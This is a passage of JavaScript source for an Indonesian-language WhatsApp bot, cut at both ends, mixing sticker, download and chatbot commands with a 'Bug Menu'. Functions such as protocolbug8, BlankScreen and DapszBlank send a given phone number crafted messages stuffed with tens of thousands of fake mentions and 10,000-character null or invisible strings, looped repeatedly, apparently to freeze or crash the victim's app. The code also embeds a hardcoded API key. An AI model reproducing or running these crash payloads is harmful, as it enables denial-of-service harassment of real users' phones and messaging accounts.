    await sleep(7000)
    }
}

async function DapszProtocol(target) {
    for (let i = 0; i < tolbug2; i++) {
    await protocolbug8(target, true) 
    await protocolbug8(target, true) 
    await protocolbug8(target, true) 
    await protocolbug8(target, true) 
    await protocolbug8(target, true) 
    await protocolbug8(target, true) 
    await DelaySsuper(target, true)
    await sleep(7000)
    }
}
async function InvisDelay(target) {
  for (let i = 0; i < 100; i++) {
    await DelaySsuper(target, true)
    await delayMakerInvisDapsz(target, true)
    await delayInvisDapsz(target, true)
    await DelayInVis(target, true)
    await DelaySsuper(target, true)
    await delayMakerInvisDapsz(target, true)
    await delayInvisDapsz(target, true)
    await DelayInVis(target, true)
    await sleep(4000)
  }
}

async function protocolbug8(target, mention) {
    const mentionedList = [
        "131355506002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const embeddedMusic = {
        musicContentMediaId: "5896081641145u71",
        songId: "870166291800508",
        author: "DapszXvictus" + "\u0000".repeat(10000),
        title: "Apollo X ",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/xrelly",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/19384532_1057304676322810_128231561544803484_n.enc?ccb=11-4&oh=01_Q5Aa1gHRy3d90Oldva3YRSUpdfcQsWd1mVWpuCXq4zV-3l2n1A&oe=685BEDA9&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "TTJaZa6KqfhanLS4/xvbxkKX/H7Mw0eQs8wxlz7pnQw=",
        fileLength: "1515940",
        seconds: 14,
        mediaKey: "4CpYvd8NsPYx+kypzAXzqdavRMAAL9oNYJOHwVwZK6Y",
        height: 1280,
        width: 720,
        fileEncSha256: "o73T8DrU9ajQOxrDoGGASGqrm63x0HdZ/OKTeqU4G7U=",
        directPath: "/v/t62.7161-24/19384532_1057304676322810_128231561544803484_n.enc?ccb=11-4&oh=01_Q5Aa1gHRy3d90Oldva3YRSUpdfcQsWd1mVWpuCXq4zV-3l2n1A&oe=685BEDA9&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1748276788",
        contextInfo: { isSampled: true, mentionedJid: mentionedList },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363400742447959@newsletter",
            serverMessageId: 1,
            newsletterName: "Dapsz-ID"
        },
        streamingSidecar: "IbapKv/MycqHJQCszNV5zzBdT9SFN+lW1Bamt2jLSFpN0GQk8s3Xa7CdzZAMsBxCKyQ/wSXBsS0Xxa1RS++KFkProDRIXdpXnAjztVRhgV2nygLJdpJw2yOcioNfGBY+vsKJm7etAHR3Hi6PeLjIeIzMNBOzOzz2+FXumzpj5BdF95T7Xxbd+CsPKhhdec9A7X4aMTnkJhZn/O2hNu7xEVvqtFj0+NZuYllr6tysNYsFnUhJghDhpXLdhU7pkv1NowDZBeQdP43TrlUMAIpZsXB+X5F8FaKcnl2u60v1KGS66Rf3Q/QUOzy4ECuXldFX",
        thumbnailDirectPath: "/v/t62.36147-24/20095859_675461125458059_4388212720945545756_n.enc?ccb=11-4&oh=01_Q5Aa1gFIesc6gbLfu9L7SrnQNVYJeVDFnIXoUOs6cHlynUGZnA&oe=685C052B&_nc_sid=5e03e0",
        thumbnailSha256: "CKh9UwMQmpWH0oFUOc/SrhSZawTp/iYxxXD0Sn9Ri8o=",
        thumbnailEncSha256: "qcxKoO41/bM7bEr/af0bu2Kf/qtftdjAbN32pHgG+eE=",        
        annotations: [{
            embeddedContent: { embeddedMusic },
            embeddedAction: true
        }]
    };

        const stickerMessage = {
        stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
            fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
            fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
            mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
            mimetype: "image/webp",
            directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
            fileLength: { low: 1, high: 0, unsigned: true },
            mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
            firstFrameLength: 19904,
            firstFrameSidecar: "KN4kQ5pyABRAgA==",
            isAnimated: true,
            isAvatar: false,
            isAiSticker: false,
            isLottie: false,
            contextInfo: {
                mentionedJid: mentionedList
            }
        }
    };

    const audioMessage = {
        audioMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7114-24/30579250_1011830034456290_180179893932468870_n.enc?ccb=11-4&oh=01_Q5Aa1gHANB--B8ZZfjRHjSNbgvr6s4scLwYlWn0pJ7sqko94gg&oe=685888BC&_nc_sid=5e03e0&mms3=true",
            mimetype: "audio/mpeg",
            fileSha256: "pqVrI58Ub2/xft1GGVZdexY/nHxu/XpfctwHTyIHezU=",
            fileLength: "389948",
            seconds: 24,
            ptt: false,
            mediaKey: "v6lUyojrV/AQxXQ0HkIIDeM7cy5IqDEZ52MDswXBXKY=",
            caption: "DapszXvictus",
            fileEncSha256: "fYH+mph91c+E21mGe+iZ9/l6UnNGzlaZLnKX1dCYZS4="
        }
    };

    const msg1 = generateWAMessageFromContent(target, {
        viewOnceMessage: { message: { videoMessage } }
    }, {});
    
    const msg2 = generateWAMessageFromContent(target, {
        viewOnceMessage: { message: stickerMessage }
    }, {});

    const msg3 = generateWAMessageFromContent(target, audioMessage, {});

    // Relay all messages
    for (const msg of [msg1, msg2, msg3]) {
        await client.relayMessage("status@broadcast", msg.message, {
            messageId: msg.key.id,
            statusJidList: [target],
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users",
                    attrs: {},
                    content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                }]
            }]
        });
    }

    if (mention) {
        await client.relayMessage(target, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg1.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [{
                tag: "meta",
                attrs: { is_status_mention: "true" },
                content: undefined
            }]
        });
    }
}
async function BlankScreen(target) {
  try {
    const ThumbRavage = "https://c.top4top.io/p_3453bc6en1.jpg";
    const imagePayload = await prepareWAMessageMedia({
      image: { url: ThumbRavage, gifPlayback: true }
    }, {
      upload: gon.waUploadToServer,
      mediaType: "image"
    });
    const msg = generateWAMessageFromContent(target, proto.Message.fromObject({
      interactiveMessage: {
        contextInfo: {
          mentionedJid: Array.from({ length: 30000 }, () =>
            "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
          ),
          isForwarded: true,
          forwardingScore: 9999,
          forwardedNewsletterMessageInfo: {
            newsletterJid: "120363400742447959@newsletter",
            newsletterName: "ꦾ".repeat(10000),
            serverMessageId: 1
          }
        },
        header: {
        title: "DapszXvictus",
          ...imagePayload,
          hasMediaAttachment: true
        },
        body: {
          text: "\u2063".repeat(10000)
        },
        footer: {
          text: ""
        },
        nativeFlowMessage: {
          buttons: [
            {
              name: "cta_url",
              buttonParamsJson: JSON.stringify({
                display_text: "ꦾ".repeat(10000),
                url: "ꦾ".repeat(10000),
                merchant_url: ""
              })
            },
            {
              name: "galaxy_message",
              buttonParamsJson: JSON.stringify({
                "screen_1_TextInput_0": "radio" + "\0".repeat(10000),
                "screen_0_Dropdown_1": "Null",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
              }),
              version: 3
            }
          ]
        }
      }
    }), { quoted: null });
    await gon.relayMessage(target, msg.message, { messageId: msg.key.id });
    console.log(`BlankScreen Delay Sent to ${target}`);
  } catch (err) {
    console.error("Error in BlankScreen:", err);
  }
}
async function BlankClick(target) {
  try {
    const ThumbRavage = "https://c.top4top.io/p_3453bc6en1.jpg";
    const imagePayload = await prepareWAMessageMedia({
      image: { url: ThumbRavage, gifPlayback: true }
    }, {
      upload: gon.waUploadToServer,
      mediaType: "image"
    });
    const msg = generateWAMessageFromContent(target, proto.Message.fromObject({
      interactiveMessage: {
        contextInfo: {
          mentionedJid: Array.from({ length: 30000 }, () =>
            "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
          ),
          isForwarded: true,
          forwardingScore: 9999,
          forwardedNewsletterMessageInfo: {
            newsletterJid: "120363400742447959@newsletter",
            newsletterName: "ꦾ".repeat(10000),
            serverMessageId: 1
          }
        },
        header: {
          title: "⨭͛͠p",
          ...imagePayload,
          hasMediaAttachment: true
        },
        body: {
          text: "\u2063".repeat(10000)
        },
        footer: {
          text: ""
        },
        nativeFlowMessage: {
          buttons: [
            {
              name: "cta_url",
              buttonParamsJson: JSON.stringify({
                display_text: "ꦾ".repeat(10000),
                url: "ꦾ".repeat(10000),
                merchant_url: ""
              })
            },
            {
              name: "galaxy_message",
              buttonParamsJson: JSON.stringify({
                "screen_1_TextInput_0": "radio" + "\0".repeat(10000),
                "screen_0_Dropdown_1": "Null",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
              }),
              version: 3
            }
          ]
        }
      }
    }), { quoted: null });
    await gon.relayMessage(target, msg.message, { messageId: msg.key.id });
    console.log(`BlankScreen Delay Sent to ${target}`);
      } catch (err) {
    console.error("Error in BlankScreen:", err);
  }
}
async function DapszBlank(target) {
  for (let i = 0; i < 100; i++) {
    await BlankScreen(target, true)
    await BlankScreen(target, true)
    await BlankScreen(target, true)
    await BlankClick(target, true)
    await BlankClick(target, true)
    await BlankClick(target, true)
    await BlankClick(target, true)
    await sleep(4000)
  }
}
const reply = async(teks, id = m.chat) => {
gon.sendMessage(m.chat, {
  text: teks,
  contextInfo: {
    externalAdReply: {
      title: "global.namabot",
      body: "",
      mediaType: 1, // 1 untuk gambar
      thumbnail: "https://files.catbox.moe/dv9ree.jpg", // harus gambar yang bisa diakses publik
      renderLargerThumbnail: false, // ← ini kunci agar thumbnail besar
      showAdAttribution: true,     // tampilkan 'Sponsored'
      sourceUrl: "https://whatsapp.com" // link saat diklik
    }
  }
}, { quoted: m });
}
const replyWithCh = text => {
    const metadata = {
        title: 'weer-Wabot',
        sourceUrl: 'https://wa.me/message/2O7NEK3DAN5DF1'
    };

    gon.sendMessage(m.chat, {
        text: text,
        contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: "Gonzales",
                newsletterJid: "120363419057657291@newsletter"
            },
            externalAdReply: {
                showAdAttribution: true,
                title: `${global.namabot}`,
                body: 'Halo bang',
                thumbnailUrl: 'https://files.catbox.moe/dv9ree.jpg',
                sourceUrl: 'Gonzales - Dev'
            }
        }
    }, { quoted: m });
};


if (body.toLowerCase() === 'tes' ) {
    m.reply('𝙰𝚔𝚝𝚒𝚏 𝚔𝚊𝚔𝚊')}
    
const from1 = m.chat;
// Fungsi loading progress bar
async function loading(gon, m) {
  let from = m.chat;
  var gon = [
    '▰▱▱▱▱▱▱▱▱▱ 10%',
    '▰▰▱▱▱▱▱▱▱▱ 20%',
    '▰▰▰▱▱▱▱▱▱▱ 30%',
    '▰▰▰▰▱▱▱▱▱▱ 40%',
    '▰▰▰▰▰▱▱▱▱▱ 50%',
    '▰▰▰▰▰▰▱▱▱▱ 60%',
    '▰▰▰▰▰▰▰▱▱▱ 70%',
    '▰▰▰▰▰▰▰▰▱▱ 80%',
    '▰▰▰▰▰▰▰▰▰▱ 90%',
    '▰▰▰▰▰▰▰▰▰▰ 100%',
    '✨ Loading Completed! ✨'
  ];

  let { key } = await gon.sendMessage(from, { text: 'ʟᴏᴀᴅɪɴɢ...' });

  for (let i = 0; i < Dinz.length; i++) {
    await gon.sendMessage(from, { text: gon[i], edit: key });
    await new Promise(resolve => setTimeout(resolve, 120));
  }
}    

console.log((`
│𝐂 𝐇 𝐀 𝐓 -- 𝐌 𝐀 𝐒 𝐔 𝐊 ⁑ ${body} ⁑ \n
┃𝗕𝗲𝗿𝗮𝘀𝗮𝗹 𝗗𝗮𝗿𝗶 ${sender}`));

global._blockedChats = global._blockedChats || {}

if (global.onlygrub && !isGroup && isCmd) {
  if (global._blockedChats[m.sender]) return;
  global._blockedChats[m.sender] = true;

  return m.reply("❌ Fitur ini hanya bisa digunakan dalam grup!\n> Jadi lu jan so asik 🗿👍\n\n\ *`Masuk ke Group Sini`*\nhttps://chat.whatsapp.com/C5TGrAxhV5yEDgCjseC6qQ");
}
//~~~~~Fitur Case~~~~~//
switch(command) {
case "menu": case "gonz": {
let teksnya = `
Hai hai *${pushname}*
*INFORMATION BOT*
> -> Creator : *Gx Dikzz*
> -> Botname : *Dikzz-bot*
> -> Version : *1.0.0*
> -> Mode : ${gon.public ? 'public' : 'private'}

  *MENU*
  -> .bugmenu
  -> .ownermenu
  -> .allmenu
`;

   
  await gon.sendMessage(m.chat, {
    footer: `Powered By Gx Dikzz `,
      buttons: [
    {
      buttonId: `.script`,
      buttonText: { displayText: 'Script' },
      type: 1
      },    {
      buttonId: `.allmenu`,
      buttonText: { displayText: 'ALL MENU' },
      type: 1
      }
  ],
      image: { url: 'https://files.catbox.moe/dv9ree.jpg' },
    caption: teksnya
  }, { quoted: text });
}
break;
case "halo": {
  replyWithCh('halo juga')
}
break
case "allmenu":
case "allcmd": {
let teksnya = `
Hai hai (*${pushname}*) aku adalah sii Weer-wabot ada yang bisa aku bantu? (*tapi aku masih tahap proses yaa*)

*INFORMATION BOT*
Creator : *Gx Dikzz*
 Botname : *Gikzz-bot*
 Version : *1.0.0*
 Mode : ${gon.public ?
'public' : 'private'}

     *𓊈⇱SEMUA MENU⇲𓊉*

◠◡◡◠◡◡◠◠ *Owner Menu* ◠◡◠◠◡◡◠

>  ✐ .addowner
>  ✐ .addprem
>  ✐ .delprem
>  ✐ .delowner

◠◡◡◠◡◡◠◠ *Group Menu* ◠◡◠◠◡◡◠
>  ✐ .promote
>  ✐ .demote


◠◡◡◠◡◡◠◠ *Ai Menu* ◠◡◠◠◡◡◠

>  ✐ .veniceai && venice
>  ✐ .chatgpt


◠◡◡◠◡◡◠◠ *Bug Menu* ◠◡◠◠◡◡◠

>  ✐ .xcombo
>  ✐ .dapsz-combo
>  ✐ .dapsz-invis
>  ✐ .dapsz-delay
>  ✐ .dapsz-protocol
>  ✐ .dapsz-blank

◠◡◡◠◡◡◠◠ *Sticker Menu* ◠◡◠◠◡◡◠

>  ✐ .brat
>  ✐ .wasted
>  ✐ .qc
>  ✐ .emojimix (🗿+😡) 
>  ✐ .animbrat

◠◡◡◠◡◡◠◠ *Tools Menu* ◠◡◠◠◡◡◠

>  ✐ .rvo
>  ✐ .getpp (tag orang nya)
>  ✐ .getcase
>  ✐ .owner
>  ✐ .script
>  ✐ .lapor-kendala && reportbu

◠◡◡◠◡◡◠◠ *Download Menu* ◠◡◠◠◡◡◠

>  ✐ .ytdl && ytdown
>  ✐ .tiktok && tt
>  ✐ .play2
>  ✐ .igdl

`;
  await gon.sendMessage(m.chat, {
    footer: teksnya,
      buttons: [
    {
      buttonId: `.script`,
      buttonText: { displayText: 'Script' },
      type: 1
      },{
      buttonId: `.bugmenu`,
      buttonText: { displayText: 'Bug Menu' },
      type: 1
      }
  ],
      image: { url: 'https://files.catbox.moe/dv9ree.jpg' },
    caption: "Gonzales Dev"
  }, { quoted: text });
}
break;

case'wm': {

if (!text) replyWithCh('Kirim Sticker nya Lah Dongo😡😡')

  const getRandom = (ext) => {
            return `${Math.floor(Math.random() * 10000)}${ext}`
        }
	let ahuh = args.join(' ').split('|')
	let satu = ahuh[0] !== '' ? ahuh[0] : `yoy`
	let dua = typeof ahuh[1] !== 'undefined' ? ahuh[1] : ``
	let { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter')
	let media = await gon.downloadAndSaveMediaMessage(quoted)
	let jancok = new Sticker(media, {
	pack: satu, // The pack name
	author: dua, // The author name
	type: StickerTypes.FULL, // The sticker type
	categories: ['🤩', '🎉'], // The sticker category
	id: '12345', // The sticker id
	quality: 70, // The quality of the output file
	background: '#FFFFFF00' // The sticker background color (only for full stickers)
	})
	let stok = getRandom(".webp")
	let nono = await jancok.toFile(stok)
	let nah = fs.readFileSync(nono)
	await gon.sendMessage(from,{sticker: nah},{quoted: m})
	await fs.unlinkSync(stok)
	await fs.unlinkSync(media)
}
	break

case'smeme': case 'stickermeme': case 'stickmeme': {

if (!/webp/.test(mime) && /image/.test(mime)) {
if (!text) return replyDinzID(`Kirim/Balas Gambar Dengan Caption ${prefix+command}
 text1|text2`)
atas = text.split('|')[0] ? text.split('|')[0] : '-'
bawah = text.split('|')[1] ? text.split('|')[1] : '-'
mee = await gon.downloadAndSaveMediaMessage(quoted)
mem = await UploadFileUgu(mee)
meme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${mem.url}`
gon.sendMessage(m.chat, { react: { text: '👍', key: m.key }})
memek = await gon.sendImageAsSticker(m.chat, meme, m, { packname: global.packname, author: global.author })
gon.sendMessage(m.chat, { react: { text: '✔️', key: m.key }})
} else {
replyWithCh(`Kirim/Balas Gambar Dengan Caption ${prefix+command}
 text1|text2`)
}
}
break


case 'chatgpt': {
    if (!text) return replyWithCh(`Contoh: ${prefix + command} Apa itu AI?`);
    const model_list = {
        chatgpt4: {
            api: 'https://stablediffusion.fr/gpt4/predict2',
            referer: 'https://stablediffusion.fr/chatgpt4'
        },
        chatgpt3: {
            api: 'https://stablediffusion.fr/gpt3/predict',
            referer: 'https://stablediffusion.fr/chatgpt3'
        }
    };

    try {
        let results = [];
        for (const [model, config] of Object.entries(model_list)) {
            try {
const axios = require('axios');
                const hmm = await axios.get(config.referer);
                const { data } = await axios.post(config.api, {
                    prompt: text
                }, {
                    headers: {
                        accept: '*/*',
                        'content-type': 'application/json',
                        origin: 'https://stablediffusion.fr',
                        referer: config.referer,
                        cookie: hmm.headers['set-cookie'].join('; '),
                        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36'
                    }
                });
                results.push(`*${model.toUpperCase()}*:\n${data.message || 'Tidak ada jawaban.'}`);
            } catch (err) {
                results.push(`*${model.toUpperCase()}*:\nGagal mengambil jawaban.`);
                console.error(`Error on ${model}:`, err.message);
            }
        }
        m.reply(results.join('\n\n'));
    } catch (e) {
        console.error(e);
        m.reply('Terjadi kesalahan saat mengambil jawaban.');
    }
}
break
case "haloo": {
  return reply('Halo Tod')
}
break
case 'wasted': {
				try {
					if (/jpg|jpeg|png/.test(mime)) {
						m.reply(mess.wait)
						let media = await quoted.download()
						let anu = await UguuSe(media)
						await gon.sendFileUrl(m.chat, 'https://some-random-api.com/canvas/wasted?avatar=' + anu.url, 'Nih Bro', m)
					} else {
						m.reply('Send Media yg ingin di Upload!')
					}
				} catch (e) {
					m.reply('Server Canvas Sedang Offline!')
				}
			}
			break
case "bugmenu": {
let Kontolnya = `
Hai ${pushname}

  *BUG MENU*
  -> .xcombo (All Func)
  -> .dapsz-combo (Combo Function)
  -> .dapsz-invis (Invisible & Delay)
  -> .dapsz-delay (Invisible & Delay)
  -> .dapsz-protocol (protocol8)
  -> .dapsz-blank (BlankScreen)
`;

  await gon.sendMessage(m.chat, {
    footer: `Powered By Gonzales  `,
      buttons: [
    {
      buttonId: `.tqto`,
      buttonText: { displayText: 'Thanks To' },
      type: 1
    }
      ],
      image: { url: 'https://files.catbox.moe/po9061.jpg' },
    caption: Kontolnya
  }, { quoted: text });
}
break;
case "ownermenu": {
let memeknya = `
Hai ${pushname}

  *BUG MENU*
  -> .addprem
  -> .addowner
  -> .delprem
  -> .delowner
`;

  await gon.sendMessage(m.chat, {
    footer: `Powered By Gx Dikzz `,
      buttons: [
    {
      buttonId: `.tqto`,
      buttonText: { displayText: 'Thanks To' },
      type: 1
    }
      ],
      image: { url: 'https://files.catbox.moe/po9061.jpg' },
    caption: memeknya
  }, { quoted: text });
}
break;
case 'dapsz-combo': {
if (!isCreator && !isPremium) return m.reply(mess.murbug);
if (!text) {
return await gon.sendMessage(m.chat, { text: `Example: .${command} 628xxx` });
    }
const target = text.trim();
const org = target.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
 // Kirim pesan awal proses
await prosesress();

await DapszCombo(org)
await DapszCombo(org)
await DapszCombo(org)
await sleep(7000)
await DapszCombo(org)
await DapszCombo(org)
await DapszCombo(org)
await DapszCombo(org)
await sleep(4000)

await doneress();
}
break
case 'dapsz-invis': {
if (!isCreator && !isPremium) return m.reply(mess.murbug);
if (!text) {
return await gon.sendMessage(m.chat, { text: `Example: .${command} 628xxx` });
    }
const target = text.trim();
const org = target.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
 // Kirim pesan awal proses
await prosesress();

await InvisDelay(org)
await InvisDelay(org)
await sleep(7000)
await InvisDelay(org)
await InvisDelay(org)
await InvisDelay(org)
await InvisDelay(org)
await sleep(4000)

await doneress();
}
break

case 'emojimix': {
				
				if (!text) return m.reply(`Example: ${prefix + command} 😅+🤔`)
				let [emoji1, emoji2] = text.split`+`
				if (!emoji1 && !emoji2) return reply(`Example: ${prefix + command} 😅+🤔`)
				try {
					let anu = await axios.get(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
					if (anu.data.results.length < 1) return m.reply(`Mix Emoji ${text} Tidak Ditemukan!`)
					for (let res of anu.data.results) {
						await gon.sendAsSticker(m.chat, res.url, m, { packname: packname, author: author })
					}
					setLimit(m, db)
				} catch (e) {
					m.reply('Gagal Mix Emoji!')
				}
			}
			break
case 'quotechat':
case 'xquote':
case 'quotly':
 case 'qc': {

const colorMap = {
  hitam: "#000000", putih: "#ffffff", merah: "#ff0000", biru: "#0000ff", kuning: "#ffff00",
  hijau: "#00ff00", ijo: "#00ff00", ungu: "#800080", pink: "#ffc0cb", oranye: "#ffa500",
  coklat: "#8b4513", abu: "#808080", pink_pastel: "#ffd1dc", cyan: "#00ffff", toska: "#40e0d0",
  lavender: "#e6e6fa", mint: "#98ff98", peach: "#ffcccb", salem: "#fa8072", emas: "#ffd700",
  silver: "#c0c0c0", navy: "#000080", maroon: "#800000", coklat_muda: "#d2b48c",
  biru_muda: "#add8e6", hijau_muda: "#90ee90", kuning_pastel: "#fdfd96", merah_muda: "#ff6961",
  biru_laut: "#4682b4", hijau_lumut: "#556b2f", ungu_muda: "#dda0dd", abu_muda: "#d3d3d3",
  karamel: "#c68e17", hijau_toska: "#20b2aa", biru_langit: "#87ceeb", coklat_tua: "#654321",
  magenta: "#ff00ff", indigo: "#4b0082", krem: "#fffdd0", coklat_kopi: "#4b2e2a",
  plum: "#dda0dd", coral: "#ff7f50", emas_tua: "#b8860b", biru_laut_tua: "#00008b",
  merah_bata: "#8b0000", salmon: "#fa8072", tomato: "#ff6347", merah_anggur: "#800020",
  sienna: "#a0522d", biru_kehijauan: "#5f9ea0", hijau_zamrud: "#50c878", aquamarine: "#7fffd4",
  chartreuse: "#7fff00", lime_green: "#32cd32", perak: "#c0c0c0", teal: "#008080", khaki: "#f0e68c",
  emas_muda: "#ffe4b5", beige: "#f5f5dc", olive: "#808000", merah_cerah: "#ff4500",
  crimson: "#dc143c", fuchsia: "#ff00ff", chocolate: "#d2691e", biru_royal: "#4169e1",
  hijau_gelap: "#006400", merah_jambu: "#ff1493", biru_es: "#e0ffff", kuning_keemasan: "#ffd700",
  jade: "#00a86b", mustard: "#ffdb58", biru_neon: "#4d4dff", aprikot: "#fbceb1",
  biru_beludru: "#483d8b", ungu_gelap: "#4b0082", pastel: "#dbb2ff", hijau_army: "#4b5320",
  pink_flamingo: "#fc74fd", ungu_terong: "#990066", biru_denim: "#1560bd", biru_baja: "#4682b4",
  kelabu_tua: "#a9a9a9", teal_muda: "#afeeee", hijau_daun: "#228b22", lavender_muda: "#e6e6fa",
  oranye_kemerahan: "#ff4500", raspberry: "#e30b5c", biru_langit_terang: "#87cefa",
  biru_arktik: "#00bfff", hijau_pastel: "#77dd77", merah_muda_terang: "#ffb6c1", kuning_neon: "#ccff00",
  emas_metalik: "#d4af37", ungu_lilac: "#c8a2c8", biru_langit_pastel: "#a1caf1", coklat_susu: "#a0522d",
  biru_petir: "#1f75fe", hijau_pistachio: "#93c572", orchid: "#da70d6", biru_pirus: "#40e0d0",
  merah_cherry: "#de3163", kuning_lemon: "#fff44f", orange_terang: "#ffae42", biru_zaitun: "#9ab973"
};
  let bgColor = "#ffffff";
  if (!text) return replyWithCh("Teksnya mana?");
    gon.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
  if (text.length > 10000) return replyWithCh("Maximal 10000 karakter!");
  let profilePic = await gon.profilePictureUrl(m.sender, "image").catch(() => "https://i.ibb.co/3Fh9V6p/avatar-contact.png");
  const payload = {
    type: "quote",
    format: "png",
    backgroundColor: bgColor,
    width: 512,
    height: 768,
    scale: 2,
    messages: [{
      entities: [],
      avatar: true,
      from: { id: 1, name: pushname, photo: { url: profilePic } },
      text: text,
      replyMessage: {}
    }]
  };
  const response = await axios.post("https://bot.lyo.su/quote/generate", payload, {
    headers: { "Content-Type": "application/json" }
  });
  const imageBuffer = Buffer.from(response.data.result.image, "base64");
    gon.sendImageAsSticker(from, imageBuffer, m, { packname: global.botname, author: global.botname })
}
break
			case 'brat': {
				if (!text && (!m.quoted || !m.quoted.text)) return m.reply(`Kirim/reply pesan *${prefix + command}* Teksnya`)
				try {
					await gon.sendAsSticker(m.chat, 'https://brat.caliphdev.com/api/brat?text=' + (text || m.quoted.text), m, { packname: packname, author: author })
					setLimit(m, db)
				} catch (e) {
					try {
						await gon.sendMessage(m.chat, { image: { url: 'https://mannoffc-x.hf.space/brat?q=' + (text || m.quoted.text) }}, { quoted: fkontak })
					} catch (e) {
						m.reply('Server Brat Sedang Offline!')
					}
				}
			}
			break
			

case 'dapsz-delay': {
if (!isCreator && !isPremium) return m.reply(mess.murbug);
if (!text) {
return await gon.sendMessage(m.chat, { text: `Example: .${command} 628xxx` });
    }
const target = text.trim();
const org = target.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
 // Kirim pesan awal proses
await prosesress();

await InvisDelay(org)
await InvisDelay(org)
await sleep(7000)
await InvisDelay(org)
await InvisDelay(org)
await InvisDelay(org)
await InvisDelay(org)
await sleep(4000)

await doneress();
}
break

case 'sc':
case 'script':
case 'owner': {

const url = "https://telegra.ph/file/65469aa05e05c2543469c.jpg";
  async function image(url) {
    const { imageMessage } = await generateWAMessageContent({
      image: { url }
    }, {
      upload: gon.waUploadToServer
    });
    return imageMessage;
  }
  let msg = generateWAMessageFromContent(
    m.chat,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: `> halo kak ${pushname}`
            },
            carouselMessage: {
              cards: [
                {
                  header: proto.Message.InteractiveMessage.Header.create({
                    ...(await prepareWAMessageMedia({ image: { url: 'https://files.catbox.moe/bl5gra.jpg' } }, { upload: gon.waUploadToServer })),
                    title: '',
                    gifPlayback: true,
                    subtitle: namaowner,
                    hasMediaAttachment: false
                  }),
                  body: { text: `> KLIK TOMBOL DIBAWAH UNTUK MENUJU KE WEBSITE OWNER` },
                  nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: `{"display_text":"WEBSITE OWNER )","url":"https://wa.me/message/2O7NEK3DAN5DF1"}`
                    },
                  ],
                  },
                },
              ],
              messageVersion: 1,
            },
          },
        },
      },
    },
    { quoted: m }
  );

  await gon.relayMessage(msg.key.remoteJid, msg.message, {
    messageId: msg.key.id,
  });
}
break

case 'dapsz-protocol': {
if (!isCreator && !isPremium) return m.reply(mess.murbug);
if (!text) {
return await gon.sendMessage(m.chat, { text: `Example: .${command} 628xxx` });
    }
const target = text.trim();
const org = target.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
 // Kirim pesan awal proses
await prosesress();

await DapszProtocol(org)
await DapszProtocol(org)
await sleep(7000)
await DapszProtocol(org)
await DapszProtocol(org)
await DapszProtocol(org)
await DapszProtocol(org)
await sleep(4000)

await doneress();
}
break
case 'dapsz-blank': {
if (!isCreator && !isPremium) return m.reply(mess.murbug);
if (!text) {
return await gon.sendMessage(m.chat, { text: `Example: .${command} 628xxx` });
    }
const target = text.trim();
const org = target.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
 // Kirim pesan awal proses
await prosesress();

await DapszBlank(org)
await DapszBlank(org)
await sleep(7000)
await DapszBlank(org)
await DapszBlank(org)
await DapszBlank(org)
await DapszBlank(org)
await sleep(4000)

await doneress();
}
break
case 'xcombo': {
if (!isCreator && !isPremium) return m.reply(mess.murbug);
if (!text) {
